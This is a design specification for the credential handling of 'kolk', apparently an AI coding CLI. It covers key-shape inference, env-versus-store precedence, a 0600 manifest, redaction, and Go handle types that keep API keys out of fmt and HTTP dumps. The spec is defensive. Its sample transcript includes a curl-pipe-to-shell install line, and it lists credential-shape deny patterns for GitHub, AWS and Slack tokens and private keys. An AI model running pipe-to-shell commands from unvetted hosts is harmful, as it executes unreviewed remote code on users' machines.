# 5. Auth, keys & secrets — "One Key In, Nothing Out"

Status: hardened on 2026-08-22 · supersedes: — · PLAN.md item 5

## Decision (the short version)

**`kolk key <key>` is the product; everything else is an upgrade path.** One provider-agnostic
command infers the provider from the key's shape, verifies it, and writes it to a **0600 manifest**
at `$data/kolk/credentials.json` — **on every OS, in a container, over SSH, in CI, with no prompt,
no dialog, no browser and no network required**. `kolk login` (OpenRouter OAuth PKCE) and the OS
keychain are both **opt-in, per machine, never on a path the user did not choose**.

Three mechanisms carry the guarantees, in this priority order, and none of them is a promise:

1. **Unreachability.** The plaintext lives in a process-local vault; `secret.Value` is an opaque
   **handle**, and the `Authorization` header is built inside a `RoundTripper` on a request clone
   that no kolk code ever holds. `protocol` (L1), `bus` (L2), `engine` (L4) and
   `session`/`stats`/`checkpoint` (L5) cannot import `internal/secret` at all, so no type in the
   event graph, on disk, or on the wire can hold a credential.
2. **Unprintability.** Where a `Value` *can* exist, every `fmt` verb redacts and every serializer
   refuses with an error. Measured today (go1.26.4, darwin/arm64): a design that stores the
   plaintext *inside* the type leaks through **8 printing paths** the moment it sits in an
   unexported struct field; the handle design leaks through **none**. §2.2 has the table.
3. **Scrubbing**, at four chokepoints, split by what a false positive costs: exact known-literal
   matching for everything the model sees, the full pattern set only for durable and published
   copies. This is the only layer with false positives, and it is the last resort, not the design.

The credential **never** reaches `config.json` again, the daemon never carries one across HTTP+SSE,
and the vendor-owned logins of item 4 are separated by four independent mechanisms — two types with
no conversion, three import bans, a shape deny-list at the door, and two `kolk doctor` renderers
that share no formatter and no value column.

Measured cost of the default path: **23 µs** for the whole resolution chain against a **5.64 ms**
cold start — and it is not on the startup path at all, which is asserted by a call-count test rather
than a timing test.

---

## Spec

### 0. ★ THE NAPKIN

The complete first-contact transcript. Three commands, no config file opened, no flags, no
questions.

```console
$ curl -fsSL https://kolk.sh/install | sh
kolk 0.1.0 → /usr/local/bin/kolk

$ kolk key sk-or-v1-EXAMPLE00000000000000000000000000000000000000000000000000000FAKE
openrouter  sk-or-v1-…FAKE   verified · $12.47 credits · free tier: no
saved to    ~/.local/share/kolk/credentials.json   (0600 — plain text, readable only by you)
tip         next time keep it out of your shell history:  pbpaste | kolk key

$ kolk "explain this repo"
```

That is the whole surface. The `saved to` and `tip` lines print **once, ever** (recorded as seen);
steady state is the single `openrouter` line. Everything else in this document — `kolk login`, the
keychain, profiles, helpers, `--why` — is reached only when the user goes looking, and every one of
them ships **off**.

If the user has no key at all, the screen is **computed, not canned** (§1.5): a keyless local model
or an installed `claude` changes what it says.

#### 0.1 `kolk key` — the command surface

| Form | Behaviour |
|---|---|
| `kolk key <key>` | infer → verify → store → one line. **The napkin command.** |
| `kolk key` *(stdin is a TTY)* | **read-only status page.** Changes nothing, prompts for nothing, safe to type. |
| `kolk key` *(stdin is a pipe)* | read the key from stdin — `pbpaste \| kolk key`, `echo "$K" \| kolk key` |
| `kolk key -` | always read stdin; when stdin **is** a TTY, prompt **without echo** and say so |
| `kolk key <provider> <key>` / `kolk key <provider> -` | explicit provider, for keys with no inferable shape |
| `kolk key --why` | the full numbered resolution trace (§1.4) |
| `kolk logout [provider]` | remove kolk's local copy; print the "this does not revoke" note |
| `kolk key --manage [provider]` | open the provider's key page for **this** key (§1.6) — an action, never a printed digest |
| `kolk key --backend file\|keychain\|helper:<n>` | move one credential to another backend (off the happy path) |

**There is no `--key` flag and there never will be.** A flag carrying a secret puts it in `ps` and
in CI logs; `gh` ships no token flag at all, and Vercel's own docs recommend the env var precisely
because argv is *"visible in process lists and logs."* The positional `kolk key <key>` is the one
unavoidable argv exposure and it is the price of the napkin — mitigated three ways above, never
denied, and never papered over.

**`kolk key <key>` refuses in CI**, exactly as `kolk login` does (§4.6): on a hosted runner the
store is discarded when the job ends, and on a self-hosted runner argv is readable by every other
job. `kolk key -` (stdin) stays allowed there, because it is the form that keeps the secret out of
argv anyway.

**No `auth` verb.** Item 9 bans synonyms: `key` adds and shows, `logout` removes, `doctor` explains.

> **Required amendment to `docs/plan/02-architecture.md` §9.** The ship list reads
> `model effort mode config models sessions stats dash saga serve login doctor update help version`
> — **`key` is absent**, yet the North star names it as one of the three commands the product *is*.
> Add `key` and `logout`. The §9 "Secrets" row (*"keychain or `KOLK_OPENROUTER_KEY`"*) is wrong
> twice and becomes: *"0600 manifest by default, OS keychain opt-in; `OPENROUTER_API_KEY` forever,
> `KOLK_API_KEY` as the provider-agnostic addition; `redact.Mask`/`redact.Scrub` over sessions,
> stats, the bus and logs."* `KOLK_OPENROUTER_KEY` was never implemented and is not introduced.

#### 0.2 Provider inference from key shape

The table is **data, not code** — `//go:embed keyshapes.json` in `internal/redact`, one file that
feeds three consumers (inference, the scrubber's shape patterns, and the bash tool's env
subtraction list), refreshed alongside the model catalog the way item 3 §5.1 refreshes model
quirks. A new provider's prefix therefore needs no kolk release.

**Infer rows — longest matching prefix wins.**

| Prefix | Provider | Confidence |
|---|---|---|
| `sk-or-v1-` | openrouter | exact |
| `sk-ant-api03-` | anthropic (API key) | exact |
| `sk-proj-` · `sk-svcacct-` · `sk-admin-` | openai | exact |
| `AIza` + 35 chars (total length 39) | google | exact (fixed length) |
| `gsk_` | groq | exact |
| `xai-` | xai | exact |
| `pplx-` | perplexity | exact |
| `fw_` | fireworks | exact |
| `csk-` | cerebras | exact |
| `nvapi-` | nvidia | exact |
| `r8_` | replicate | exact |
| `hf_` | huggingface | exact |
| `sk-` + ≥ 40 alphanumerics | openai (legacy) | **catch-all, lowest priority — AMBIGUOUS** |
| *no prefix* — Mistral (32 alnum), Cohere (40), Together (hex), any self-hosted gateway | — | **undetectable by shape** |

**Deny rows — these beat every infer row regardless of prefix length. Refuse, store nothing, explain.**

| Prefix | Message | Exit |
|---|---|---|
| **`sk-ant-oat…` · `sk-ant-ort…`** | *"That is a Claude **subscription** token, not an API key. kolk must never hold one. To use your Claude plan: `kolk login claude` — kolk hands you to Anthropic's own sign-in, creates no pipe to it, and never sees the credential. To use an Anthropic API key: `kolk key sk-ant-api03-…`"* | 2 |
| `ghp_ gho_ ghs_ ghu_ ghr_ github_pat_` | *"That's a GitHub token — kolk doesn't use one."* | 2 |
| `AKIA…` · `ASIA…` | AWS access key id | 2 |
| `xoxb- xoxp- xoxa- xoxs-` | Slack | 2 |
| contains `-----BEGIN` | a private key | 2 |

The **ordering rule is load-bearing, not incidental**: a generic `sk-ant-` infer row would silently
swallow a Claude subscription token into kolk's store — the exact violation item 4 exists to
prevent. Deny beats infer, always.

#### 0.3 Ambiguity rules, and the one question

1. **Longest matching prefix wins.**
2. **Deny rows beat infer rows**, regardless of length.
3. **Exactly one match → accept silently.** One line of output, no question.
4. **Zero matches, or two or more after rule 1 → ask once.** A numbered list of four, arrow keys,
   no flag to learn:
   ```console
   $ kolk key 7f3c9a2b1d4e8a05f6b7c8d9e0f1a2b3
   I don't recognise that key's shape.

     1) openrouter   2) openai   3) anthropic   4) mistral   5) other…
   › 
   ```
5. **Not a TTY, and inference cannot decide → exit 2**, naming the escape:
   `kolk key <provider> -   # e.g. kolk key mistral -`
6. **★ kolk never sends a credential to a host it has not been told to use.** Verification is
   *confirmation of the single inferred provider*, never discovery across candidates. Probing
   OpenAI, then DeepSeek, then a gateway with a bare `sk-` key resolves the ambiguity in ~400 ms by
   handing the user's live credential to up to two vendors who should never have seen it — for many
   organisations a reportable incident. One question is cheap; an unrecoverable disclosure is not.
7. **Verification** (OpenRouter only in v0.1): one `GET /api/v1/key` (item 3 §6.6 already caches it
   5 min) → credits and free-tier status. Hard 2 s budget; failure is a **warning, never an error**;
   `--no-verify` exists and nobody needs it. Offline → stored with `verified` unset and a grey row
   in `doctor`. Every other provider stores with `verified` unset and says so honestly, because v0.1
   routes through OpenRouter and has no path to test an Anthropic key. Verification's real payoff is
   the *common* failure — a truncated paste — which today's `kolk config set-key` accepts in total
   silence.
8. **A recognised-but-not-yet-usable key is stored, not refused.** Refusing throws away the user's
   paste; a `[y/N]` is a questionnaire.
   ```console
   $ kolk key sk-ant-api03-…8f10
   anthropic   sk-ant-…8f10   stored, unused in v0.1
   kolk v0.1 reaches Claude models through OpenRouter, so this key is kept for v0.2.
     use Claude now:                     kolk key sk-or-v1-…
     already have a Claude subscription: kolk login claude
   ```

---

### 1. The credential model and the precedence chain

#### 1.1 Two steps, two lists — never one mixed table

Resolution is **two independent steps**, and merging them is what makes AWS's chain unexplainable.

**Step A — *which* credential (the `Ref`). Carries no secret, ever.**

| # | Source | v0.1 |
|---|---|---|
| A1 | `--profile <name>` | **not implemented** (§7) |
| A2 | `KOLK_PROFILE` | **not read** — a hidden variable that changes credential selection is a surprise, and surprises are what this design is optimised against |
| A3 | project `.kolk/config.toml` `profile = "…"` | **not implemented** |
| A4 | `"default"` | ← v0.1 always. One constant, at one call site. |

The provider half of the `Ref` comes from the active backend (`openrouter` by default;
`openaicompat` when a non-OpenRouter `--base-url` is in play; `claude`, which holds no credential
at all).

**Step B — *which source* holds a value for that `Ref`. First hit wins; the search stops; nothing merges.**

| # | Link | Detail |
|---|---|---|
| **0** | *(a secret-bearing flag)* | **structurally empty, and printed as empty** so nobody adds one. `kolk key --why` renders `0  flag  (none — by design; a secret in argv is world-readable)`. |
| **1** | `KOLK_API_KEY` | provider from `KOLK_PROVIDER`, else inferred from shape. Shape mismatch **warns**, never re-routes. |
| **2** | provider-native env | a **curated** list only: `OPENROUTER_API_KEY` `ANTHROPIC_API_KEY` `OPENAI_API_KEY` `GEMINI_API_KEY` `GROQ_API_KEY` `XAI_API_KEY` `MISTRAL_API_KEY` `TOGETHER_API_KEY` `DEEPSEEK_API_KEY`. Auto-deriving a name from a provider id is ambiguous the moment an id contains an underscore, and it makes the bash-tool deny list unknowable. `OPENROUTER_API_KEY` / `OPENROUTER_BASE_URL` **keep working forever** (arch §9 already promises it). |
| **3** | **the store** — the manifest entry for this `Ref`, routed to its **one** named backend | `file` (default) · `keychain` · `dpapi` · `helper:<name>`. |
| **4** | none | → the three-state outcome screen (§1.5) |

Two rules make this defensible:

- **Link 3 is a lookup, not a cascade.** The manifest names exactly one backend per credential. If
  that backend fails, kolk stops with a named remedy — it does **not** try a different backend.
  Silently reaching for another stored value could hand the user a stale key from a previous machine
  and bill the wrong account, which is precisely the failure this item exists to prevent. AWS's
  worst UX decision — a credentials file *and* a config file at two different precedence levels
  holding the same profile names — is structurally impossible here.
- **Env beats stored**, matching `gh` (*"takes precedence over previously stored credentials"*),
  `aws`, `flyctl`, `wrangler` and `vercel`. Stripe inverts it (env beats even its own flag) and is a
  documented support trap; kolk does not dissent.

#### 1.2 Three outcomes per link, never two

| Backend result | Chain behaviour |
|---|---|
| `ErrNotFound` — genuinely nothing here | **continue** to the next link |
| `ErrLocked` · `ErrUnavailable` · `ErrTimeout` | **stop.** Named, actionable error naming the backend and the machine (§3.5). *Never* falls through to "kolk needs a key" — a locked keychain rendering as "no credential" invites the user to paste a second key and end up with two live credentials, one of which they will never rotate. |
| `ErrCorrupt` · `ErrForeignOwner` | **stop and refuse.** Name the path. |
| hit | resolve, record the `Origin`, and `Probe` (never `Lookup`) the remaining links so the trace can report what was shadowed |

#### 1.3 Resolution never requires a write, and never requires a home directory

**This is a live bug fix, not a new requirement.** Verified today on this machine:

```console
$ env -u HOME OPENROUTER_API_KEY=sk-or-v1-… kolk config show
error: $HOME is not defined                                  ← exits 1 with a valid key in hand
```

`cmd/kolk/main.go:114` calls `config.Load()` → `os.UserHomeDir()` → `fatal`. So the one environment
where env-var credentials are the entire point — a distroless container, `docker run -u 1001` with
no passwd entry, a k8s pod with no `HOME`, a read-only rootfs — is the environment kolk dies in.

**Rule:** the store link's failure to *locate* its directory is a **skip**, never an error. Env-only
resolution completes with **zero disk access** — no manifest read, no migration, no `.gitignore`
drop. Migration and the `.gitignore` fire only from *write* commands (`kolk key`, `kolk login`); a
read-only `$HOME` degrades those with a message and leaves the read path untouched.

#### 1.4 How the user finds out which source won — three places, escalating

**(a) At write time — the shadowing warning.** Not a prompt, not a refusal, one line at the exact
moment the user's mental model diverged from reality:

```console
$ kolk key sk-or-v1-EXAM…FAKE
openrouter  sk-or-v1-…FAKE   verified · $12.47 credits
saved to    ~/.local/share/kolk/credentials.json (0600)

!  $OPENROUTER_API_KEY is set in this shell and wins (link 2 beats link 3).
   kolk will keep using …9c31 until you unset it.          see: kolk key --why
```

**(b) ★ At read time — because a write-time-only warning is invisible to the user who set the
variable afterwards.** "Why is kolk using the wrong key" is ~90% one scenario: a stale export in a
shell rc, added *after* `kolk key` ran. So: when the winning link is an env var **and** the store
holds a credential for the same `Ref` with a **different `key_hash`** (already in the manifest,
already non-secret), print one stderr line on the first turn of a session — **at most once per
(env-hash, stored-hash) pair**, recorded by a marker file in the state dir. Cost: a string compare
on a path that is already reading the manifest.

**(c) `kolk key --why` — the full trace.** Always fully populated: every link, in order, including
the empty ones and the shadowed ones, so *"the list is short because there is nothing"* is never
confusable with *"the resolver did not look."*

```console
$ kolk key --why
profile  default                                            (v0.1 has one profile)
ref      openrouter/default

  0  flag                              (none — by design; a secret in argv is world-readable)
  1  KOLK_API_KEY                      not set
  2  OPENROUTER_API_KEY   sk-or-v1-…9c31   ← IN USE
  3  store: file          sk-or-v1-…FAKE   present, shadowed by link 2   (a different key)
       ~/.local/share/kolk/credentials.json · added 2026-08-19 · verified 3 d ago
       manage / revoke:  kolk key --manage openrouter

  effective  sk-or-v1-…9c31 from $OPENROUTER_API_KEY (link 2)
```

#### 1.5 `kolk doctor` — and the three states of "no credential"

**"No credential" is a computed outcome, not a canned screen.** `03-provider-layer.md` §2550 already
deleted the `APIKey == ""` hard failure for non-OpenRouter base URLs; item 4 already gives a backend
for which kolk holds nothing. Item 5 is the layer that turns both into a screen, and
`cmd/kolk/main.go:118`'s unconditional exit is **deleted as part of this item**, not left to item 3.

| State | Condition | Behaviour |
|---|---|---|
| **NOT REQUIRED** | the resolved base URL is not OpenRouter (Ollama, LM Studio, vLLM, a keyless gateway) | **proceed, never prompt.** One line: `no key needed — local model at http://localhost:11434` |
| **ALTERNATIVE AVAILABLE** | `shell.LookPath("claude")` succeeds | add the `kolk login claude` line to the screen |
| **REQUIRED AND MISSING** | otherwise | the screen below, exit **2** (usage — the user must do something; nothing broke) |

```console
$ kolk
kolk needs a key. Either takes about ten seconds:

  paste one     kolk key sk-or-v1-…      sign up free at openrouter.ai — free models, no card
  or sign in    kolk login               opens your browser

  Already exporting OPENROUTER_API_KEY? kolk picks it up automatically.
```

The free path is named **first** and named as free. `docs/research/openrouter.md` records the real
limits — **20 requests/min and 50/day until $10 of lifetime purchases, 1000/day after** — so the
number is rendered from `GET /api/v1/key`'s live fields and the `$10` threshold is spelled out.
**Never a hard-coded "1000/day"**; every design draft got this 20× wrong for exactly the user who
took the free route.

`kolk doctor`, the full report:

```console
$ kolk doctor
kolk 0.1.0  darwin/arm64
config ~/.config/kolk   data ~/.local/share/kolk   cache ~/.cache/kolk

credentials  (kolk holds these)
  openrouter · default
    0  flag                              (none — by design)
    1  KOLK_API_KEY                      not set
    2  OPENROUTER_API_KEY   sk-or-v1-…9c31   ← IN USE
    3  store: file          sk-or-v1-…FAKE   present, shadowed by link 2
         added 2026-08-19 · verified 3 d ago · manage: kolk key --manage openrouter
    → effective: link 2. To use the stored key: unset OPENROUTER_API_KEY
  anthropic · default
    3  store: file          sk-ant-…8f10     stored, unused in v0.1

agent backends  (kolk holds nothing — the vendor owns its own login)
  claude    claude 2.1.240 · claude reports: signed in (max, firstParty)
            kolk stores no credential for this backend and never reads one
  codex     not installed
  gemini    n/a — API key only; Google prohibits third-party use of Gemini CLI OAuth

redaction
  bash-tool env subtraction   active · 12 kolk-owned names withheld from child processes
  scrubber                    26 shape patterns + 2 live credential literals (exact match)

storage note
  ~/.local/share/kolk/credentials.json is plain text, 0600, this user only.
  It is included in whatever backs up your home directory.
  Encrypt it at rest with your OS keychain:  kolk key --backend keychain
```

Rules encoded in that shape, each earning its place:

- **Exactly one `← IN USE` per (provider, profile).** `gh auth status`'s single best detail is
  printing the credential source inline on the headline (`✓ Logged in to github.com account monalisa
  (keyring)`, and on failure *"The token in `GH_TOKEN` is invalid"*). kolk generalises it from
  *accounts* to *sources*, which is where the confusion actually lives.
- **Empty links print a row saying they are empty.**
- **`cmd_doctor.go` contains zero `Reveal()` calls** (CI-asserted) and calls `Chain.Explain`
  (`Probe`-only), never `Chain.Resolve`.
- **`doctor` verifies EXISTENCE, it does not render cached metadata as if it were truth.** For the
  `file` backend that is a free `os.Lstat` on the manifest plus the inline value. For an opt-in
  backend it is a **metadata-only, data-never probe** under a 2 s deadline (§3.6): on macOS
  `security find-generic-password -s kolk -a <ref>` with **no `-g`, no `-w`, no `-d`** — attributes
  only, no ACL evaluation, therefore no dialog, CI-asserted on the argv. On probe failure or timeout
  the row reads `unknown — could not check` and doctor exits 2. A diagnostic that certifies a broken
  install as healthy is worse than no diagnostic; a diagnostic that raises a password dialog is
  worse still; the metadata probe is the only point that is neither.
- **Exit codes** (arch §9's five, no invented ones): **0** a credential resolves and verified ·
  **1** a backend failed or verification failed · **2** none resolves, or the manifest and reality
  disagree.

#### 1.6 The manage / revoke link is an action, never a printed digest

OpenRouter keys `sk-or-v1-…` are 64 hex characters and their settings page is
`openrouter.ai/keys/<sha256hex(key)>` (with `openrouter.ai/logs?api_key_hash=<hash>` for the request
log); both resolve only for the signed-in owner.

`kolk doctor` output exists to be pasted into a GitHub issue. **A full unsigned `sha256(key)` in a
public issue is a permanent confirmation oracle**: given any candidate key from any other leak, an
attacker checks membership in one hash — and it rescues an attacker from an otherwise-useless
partial disclosure (a shoulder-surfed screenshot showing 56 of 64 hex characters leaves 2³² 
candidates, brute-forced against a published hash in seconds on a laptop).

So:

- `key_hash` (full `sha256hex`) lives **only** in the 0600 manifest. It is a rotation detector
  (`sha256hex(resolved) != entry.key_hash` ⇒ "the key in `$OPENROUTER_API_KEY` is not the one you
  saved") and the input to the deep link.
- **Nothing key-derived is ever rendered.** `doctor`, `key`, `--why` and `logout` print the mask
  (`sk-or-v1-…FAKE`) and, where a comparison is needed *within one run*, a **per-process-salted**
  fingerprint — comparable inside the run, worthless outside it, unbruteforceable offline.
- The deep link is reached by **`kolk key --manage [provider]`**, which opens the browser. This also
  removes the broken-truncated-URL bug every draft had (`openrouter.ai/keys/9a3f2c11` is not a URL
  that resolves).

---

### 2. `internal/secret`, `internal/redact`, `internal/keystore` — the real Go

#### 2.1 Three L0 packages, not one — an amendment to arch §1/§2/§4/§5

`02-architecture.md` reserves a single `internal/secret/` holding the `Store` interface **and**
`Redact`. **Split it into three.** The split is not tidiness; each boundary is an *import rule*,
which `arch_test.go` enforces mechanically, replacing a source grep that a reviewer has to remember.

| Package | Layer | Contents | May be imported by |
|---|---|---|---|
| **`internal/redact`** | L0 · **stdlib only, imports nothing from `internal/`** | `Mask` · `Scrub` · `Register` · `Writer` · `SanitizeControls` · the embedded shape table. **No credential type.** | **everyone, including `internal/provider/agentcli`** |
| **`internal/secret`** | L0 · **touches no OS at all** — no `os`, no `os/exec`, no `syscall`, no env, no files | `Value` (the handle) · the vault · `Credential` (the lazy promise) · `AuthTransport` | `provider` (L3), `serve`, `cli`, `keystore`. **Never `agentcli`.** |
| **`internal/keystore`** | L0 · the **only** package in the tree that reads or writes a credential | `Ref` `Backend` `Entry` `Store` · the manifest · every backend · the `Chain` resolver | **`internal/cli` and `internal/serve` only** |

Why three and not two: **item 4 C1 requires `agentcli` to scrub the vendor's stderr tail, while item
4 G3/C4 requires `agentcli` to be structurally unable to name a credential type.** Go's import
granularity is the package, so one package cannot satisfy both. `redact` is the scrubbing half with
no credential type in it; `secret` is the credential type with no scrubbing entry point that
`agentcli` needs.

Why `secret` touches no OS: it makes arch §5's rule *"L1–L5 may not touch the OS"* hold **literally**
even though L3 holds credentials. `keystore` declares its own `Spawner` port (like `provider` does)
so it never imports `internal/shell` and never transitively reaches `os/exec`.

**Amendments to record in `02-architecture.md` in the same commit as migration step 5:**

| § | Change |
|---|---|
| §1 dependency table | L0 line becomes `paths shell atomicfile lock term secret redact keystore xid buildinfo`; the `golang.org/x/sys` allowance moves from `secret` to **`keystore`, and only in `dpapi_windows.go`** (step 13); `term` keeps its allowance |
| §1 | new rule: **an L0 package may import another L0 package only via an explicit edge listed in `layers.go`.** The only edges are `secret → redact` and `keystore → {secret, redact}`. Everything else in L0 stays stdlib-only. |
| §2 tree | replace the `secret/` line with the three trees in §2.6 below |
| §4 | `main.go:554 maskKey` → **`internal/redact/redact.go`** as `redact.Mask` (not `internal/secret/redact.go`) |
| §5 layer table | add `redact` and `keystore` to L0, with the L6-only importer rule on `keystore` |
| §9 | ship list gains `key` and `logout`; the Secrets row is rewritten (§0.1) |
| §12 step 5 | the L0 extraction also (a) moves `ResolveAPIKey` **off** the startup path and (b) moves `api_key` **out** of `config.json` |

#### 2.2 `secret.Value` — the handle, and the measurement that forces it

**Executed on this machine, go1.26.4 / darwin arm64, 2026-08-22.** Canary = a fake `sk-or-v1-…`
key, full method set on both designs (`Format`, `String`, `GoString`, `MarshalJSON`, `LogValue`):

| Printing path | **A: plaintext inside the type** | **B: handle into a vault** |
|---|---|---|
| `%v` / `%+v` / `%#v` on an **exported** field | ok · ok · ok | ok · ok · ok |
| `%v` on an **unexported** field | **LEAK** `{{sk-or-v1-CANARY…}}` | ok `{{1 openrouter}}` |
| `%+v` unexported | **LEAK** `{key:{s:sk-or-v1-CANARY…}}` | ok `{key:{h:1 Label:openrouter}}` |
| `%#v` unexported | **LEAK** `main.A{s:"sk-or-v1-CANARY…"}` | ok `main.B{h:0x1, Label:"openrouter"}` |
| `%s` unexported | **LEAK** | ok |
| `%q` unexported | **LEAK** | ok |
| `fmt.Errorf("cfg %+v", host)` | **LEAK** | ok |
| `slog` on a struct with an unexported field | **LEAK** | ok |
| `json.Marshal` (either visibility) | ok | ok |

**Eight leak paths versus zero.** The cause: `fmt.printValue` reaches `handleMethods` only when
`value.CanInterface()`, which is **false for an unexported struct field**; `Format`/`String`/
`GoString` are never called and reflection prints the raw string. `encoding/json` is the *safe* sink
(it skips unexported fields); **`fmt` is the dangerous one**, and `fmt` is what a `recover()`
handler, a debug `log.Printf` and a hastily-added error wrap all reach for.

**Conclusion, non-negotiable: the plaintext is not in the type.**

```go
// Package secret owns kolk's credential VALUE and the one place a credential is
// allowed to become an HTTP header. L0, stdlib only, and it touches NO OS: no
// os, no os/exec, no syscall, no env, no files. That is what makes it safe to
// import from L3.
package secret

// Value is a credential HANDLE. The plaintext is not a field of this struct and
// cannot be recovered from it by fmt, reflection, encoding/json, encoding/gob,
// slog, text/template, a panic traceback, or a core dump of a struct copy.
//
// Measured 2026-08-22 (go1.26.4 darwin/arm64): a type that stores the plaintext
// inline leaks it through %v, %+v, %#v, %s, %q, slog and fmt.Errorf the moment
// it sits in an UNEXPORTED struct field. Eight leak paths, all closed by not
// storing the value. Do not "simplify" this into a struct{s string}.
//
// The zero Value is valid: IsZero() is true, Reveal() returns "", every printed
// form is "[unset]". A forgotten field is therefore SAFE BY DEFAULT.
//
// A Value is meaningless outside the process that minted it — the handle indexes
// a package-local vault. That is the structural reason no frame, file or event
// can carry one.
type Value struct {
    h     uint64 // vault handle; 0 == the empty secret
    Label string // SAFE metadata, printable: "openrouter/default", "serve-token"
}

// ── construction ────────────────────────────────────────────────────────────
// New copies plaintext into the vault, clears the caller's slice, and REGISTERS
// the bytes with internal/redact as a known literal. Registration happens at
// CONSTRUCTION, not at first Reveal: a tool result produced before the first
// HTTP request is then already literal-scrubbed. keystore registers EVERY entry
// it parses, not only the one being resolved (§5, D-M3).
func New(label string, plaintext []byte) Value

// NewString exists only for the two unavoidable string sources — os.Getenv and
// the JSON decoder — and is on the CI call-site allow-list.
func NewString(label, plaintext string) Value

// ── the only public exit ────────────────────────────────────────────────────
// Reveal is pinned by arch_test.go to a committed allow-list of THREE files:
//   internal/secret/transport.go    the Authorization header, inside RoundTrip
//   internal/serve/auth.go          crypto/subtle.ConstantTimeCompare
//   internal/keystore/backend.go    the single encode/decode file for all backends
// Nothing else in the tree may call it. Not cmd_doctor.go, not cmd_key.go, not
// cmd_config.go, not internal/cli/render, not agentcli (which cannot even
// import this package).
func (v Value) Reveal() string

// ── every printing path ─────────────────────────────────────────────────────
// Format catches EVERY verb: fmt checks Formatter before Stringer and
// GoStringer, so this one method covers %v %+v %#v %s %q %x %d and any verb fmt
// adds later. It is the load-bearing method.
func (v Value) Format(f fmt.State, verb rune) { io.WriteString(f, v.shown()) }
func (v Value) String() string                { return v.shown() }
func (v Value) GoString() string              { return "secret.Value{" + v.Label + ":[redacted]}" }
func (v Value) LogValue() slog.Value          { return slog.StringValue(v.shown()) }

// ── every serializing path REFUSES ──────────────────────────────────────────
// An error, not a placeholder: a silent redaction hides the bug forever, an
// error surfaces it in CI on the first run. See §8 for the release-build
// behaviour, which must never cost a user their session.
var ErrMarshal = errors.New("secret: refusing to serialize a credential")

func (v Value) MarshalJSON() ([]byte, error)   { return nil, ErrMarshal }
func (v Value) MarshalText() ([]byte, error)   { return nil, ErrMarshal }
func (v Value) MarshalBinary() ([]byte, error) { return nil, ErrMarshal }
func (v Value) GobEncode() ([]byte, error)     { return nil, ErrMarshal }

// UnmarshalJSON ALWAYS errors, so a Value can never be CONSTRUCTED by decoding a
// frame, a config file or an HTTP body — in either direction. That is what makes
// the daemon boundary structural instead of reviewed.
func (v *Value) UnmarshalJSON([]byte) error { return ErrMarshal }

// ── safe derived facts (plain strings; they marshal fine) ────────────────────
func (v Value) IsZero() bool
func (v Value) Mask() string        // redact.Mask(plaintext) — "sk-or-v1-…FAKE"
func (v Value) Fingerprint() string // sha256(processSalt‖plaintext)[:4] hex.
                                    // Comparable WITHIN a run; uncorrelatable across runs;
                                    // unbruteforceable offline. The ONLY digest ever displayed.
func (v Value) shown() string       // "[redacted openrouter/default #3f2a]" | "[unset]"
```

The vault, `internal/secret/vault.go`:

```go
var vault struct {
    mu   sync.RWMutex
    next uint64
    m    map[uint64][]byte // plaintext as []byte so it CAN be cleared
    salt [16]byte          // crypto/rand at init; feeds Fingerprint
}

// Close clears every vault slice. HONEST SCOPE: Go strings are immutable and
// Reveal() hands out a GC-owned copy. Close narrows the window; it does not
// eliminate copies. Documented in Risks; never a README claim.
func Close()
```

#### 2.3 ★ `secret.AuthTransport` — the leak the handle type does *not* close

The handle protects the credential right up to `Reveal()` — and then every draft handed the
plaintext to `req.Header.Set("Authorization", "Bearer "+v.Reveal())`. `http.Header` is a plain
`map[string][]string`. **Measured on this machine, same run as §2.2:**

```
http.Request %+v    LEAK   map[Authorization:[Bearer sk-or-v1-CANARY0000deadbeefcafe]]
```

One `%+v` in a retry/backoff wrapper, a `recover()` handler, or a 5xx error path prints the live key
to stderr — into CI logs, into the scrollback the user pastes into an issue, and (on any path wired
before the scrubbing writer) onto disk. An **unrecovered panic traceback is written by the runtime
straight to fd 2 and bypasses all four scrub chokepoints.** The handle type creates false confidence
exactly here: a reviewer sees `secret.Value` and stops looking.

**The header must never exist on a request object any caller can hold.**

```go
// internal/secret/transport.go — the ONLY file in the tree that builds an
// Authorization header from a credential, and one of three permitted Reveal()
// call sites.
type AuthTransport struct {
    Cred Credential
    Next http.RoundTripper
}

func (t AuthTransport) RoundTrip(r *http.Request) (*http.Response, error) {
    v, err := t.Cred.Get(r.Context())
    if err != nil {
        return nil, err
    }
    r2 := r.Clone(r.Context())                       // the clone lives only inside net/http
    r2.Header.Set("Authorization", "Bearer "+v.Reveal())
    return t.Next.RoundTrip(r2)
}
```

Two CI rules ride with it (§8): **no `%v`/`%+v`/`%#v`/`%q`/`%s` applied to `*http.Request` or
`http.Header` anywhere in the module** (AST check, the same machinery as the `Reveal()` allow-list),
and `GOTRACEBACK` pinned to `single`.

#### 2.4 `secret.Credential` — the lazy promise the provider layer receives

Item 3 §1.9 requires that *"`internal/provider` reads no file and no environment variable"*, and the
provider must not be able to enumerate or write the store. So it receives neither a `string` nor a
`Store`:

```go
// Credential is a one-shot, memoizing promise for a Value. It cannot enumerate,
// cannot write, cannot name a backend, and cannot be constructed by decoding.
// L6 starts the resolution; L3 awaits the result. So the provider layer still
// reads no file and no env var, and the credential read can be overlapped with
// the dial (§3.7) without any layer violation.
type Credential struct{ await func(context.Context) (Value, error) }

func (c Credential) Get(ctx context.Context) (Value, error)
func Promise(f func(context.Context) (Value, error)) Credential
```

> **Amendment to `03-provider-layer.md` §1.9: `provider.Config.APIKey string` is deleted.** The
> registry gains **two factory signatures**, so the vendor path has no parameter a credential could
> be handed to:
> ```go
> // keyedFactory: backends that authenticate with a credential KOLK HOLDS.
> type keyedFactory func(ctx context.Context, cfg Config, cred secret.Credential) (Chat, error)
> // vendorFactory: backends whose credential is owned, stored and refreshed BY
> // THE VENDOR'S OWN BINARY. There is deliberately no secret.Credential
> // parameter here, and adding one is a compile error at every call site.
> type vendorFactory func(ctx context.Context, cfg Config) (Chat, error)
> ```
> With a shared `Config.APIKey`, `agentcli` can reach a credential simply by being handed the struct
> every backend is handed, and the only defence is a runtime promise that the field is empty. Two
> signatures make it a type error. This churn is worth it.

#### 2.5 `keystore` — Ref, Entry, Store, Chain

```go
// Package keystore is L0 and is the ONLY package in the tree that reads or
// writes a credential. stdlib + golang.org/x/sys (dpapi_windows.go only). No
// cgo. No third-party keyring library. Everything cross-compiles with
// CGO_ENABLED=0.
package keystore

// Ref names a credential slot. It NEVER contains a secret and is safe to print,
// log, and use as a filename component.
type Ref struct {
    Provider string // registry key, lowercase: openrouter | anthropic | openai | …
    Profile  string // "default" in v0.1 (§7)
}

func (r Ref) String() string { return r.Provider + "/" + r.Profile }

type Backend string

const (
